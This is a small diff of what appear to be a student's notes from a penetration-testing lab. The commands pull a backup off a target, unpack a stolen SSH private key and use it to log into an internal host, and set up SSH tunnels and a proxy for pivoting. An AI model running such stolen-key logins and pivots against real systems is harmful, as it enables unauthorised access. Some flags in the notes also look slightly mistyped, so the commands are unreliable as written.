@@ -138,7 +138,8 @@ scp -P 20010 www-data@localhost:/tmp/backup.gz /home/student/backup.tar.gz
 chmod 600 stolenkey1
 tar -xvf /home/student/stolenkey1 -C /home/student/stolenkey1_gun
 
-ssh -i /home/student/stolenkey1 Donovian-Intranet@192.168.150.253
+chmod 600 /home/student/stolenkey1_gun/.ssh/id_rsa.pub
+ssh -i /home/student/stolenkey1_gun/.ssh/id_rsa Comrade@192.168.150.253 -p 41011
 
 ssh -MS /tmp/hype hype -O forward student@JUMP -L 41010:192.168.28.100:2222
 ssh student@localhost -p 41010 -d 9050
